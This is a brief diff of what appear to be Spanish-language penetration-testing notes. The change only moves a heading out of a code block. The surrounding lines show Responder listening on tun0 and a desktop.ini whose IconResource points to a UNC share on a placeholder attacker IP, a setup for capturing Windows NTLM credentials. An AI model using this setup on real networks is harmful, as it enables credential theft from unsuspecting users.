@@ -225,7 +225,8 @@ $responder -I tun0 -wPv
 $nano desktop.ini
 ```
 
-``` #### Dentro de desktop.ini ####
+#### Dentro de desktop.ini ####
+``` 
 [.ShellClassInfo]
 IconResource=\\ip-atacante\test
 ```
